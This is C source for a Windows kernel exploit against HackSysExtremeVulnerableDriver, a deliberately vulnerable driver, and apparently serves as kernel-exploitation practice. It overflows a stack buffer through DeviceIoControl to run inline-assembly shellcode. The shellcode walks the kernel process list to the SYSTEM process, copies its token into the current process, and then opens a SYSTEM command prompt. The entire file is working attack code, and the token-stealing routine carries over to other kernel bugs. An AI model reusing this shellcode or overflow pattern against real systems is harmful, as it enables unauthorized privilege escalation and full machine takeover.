#include <stdio.h>
#include <Windows.h>

#define KTHREAD_OFFSET  0x124		//+0x124 CurrentThread      : Ptr32 _KTHREAD
#define EPROCESS_OFFSET 0x050		//+0x050 Process            : Ptr32 _KPROCESS
#define FLINK_OFFSET    0x0b8		//+0x0b8 ActiveProcessLinks : _LIST_ENTRY
#define PID_OFFSET      0x0b4		//+0x0b4 UniqueProcessId    : Ptr32 Void
#define TOKEN_OFFSET    0x0f8		//+0x0f8 Token              : _EX_FAST_REF
#define SYSTEM_PID      0x004		//System Process ID
#define BUFFER_SIZE	    0x224		//Overflow offset
#define IO_CODE		    0x222007

VOID TokenStealingShellcode()
{
    __asm
    {
        ; initialize
        pushad;
        mov eax, fs: [KTHREAD_OFFSET] ;	    //get current thread
        mov ecx, [eax + EPROCESS_OFFSET];	//get the process
        mov eax, ecx;
        mov ebx, SYSTEM_PID;

    SearchSystemPID:
        mov eax, [eax + FLINK_OFFSET];	    //get the ActiveProcessLinks
        sub eax, FLINK_OFFSET;
        mov edx, [eax + PID_OFFSET];	    //get the PID
        cmp edx, ebx;
        jnz SearchSystemPID;

        mov edx, [eax + TOKEN_OFFSET];	    //change the token
        mov[ecx + TOKEN_OFFSET], edx;

        ; recovery
        popad;
        add esp, 0xC;			            //fix the stack
        pop ebp;
        ret 8;
    }
}

void CreateCmd()
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
    CHAR buffer[BUFFER_SIZE];
    ULONG length = 0;

    HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        0);

    if (hDevice == INVALID_HANDLE_VALUE || !hDevice)
    {
        printf("[-] Failed To Open Driver\n");
        printf("[-] Error Code: %d\n", GetLastError());
        exit(1);
    }

    memset(buffer, 'a', BUFFER_SIZE);
    *(PULONG)(buffer + 0x220) = (ULONG)TokenStealingShellcode;
    BOOL ret = DeviceIoControl(hDevice,
        IO_CODE,
        buffer,
        BUFFER_SIZE,
        NULL,
        0,
        &length,
        NULL);
    if (!ret)
    {
        printf("[-] Failed To Send message\n");
        printf("[-] Error Code: %d\n", GetLastError());
        exit(1);
    }

    printf("[+] Time To Get Shell\n");
    CreateCmd();
    CloseHandle(hDevice);
    system("pause");
    return 0;
}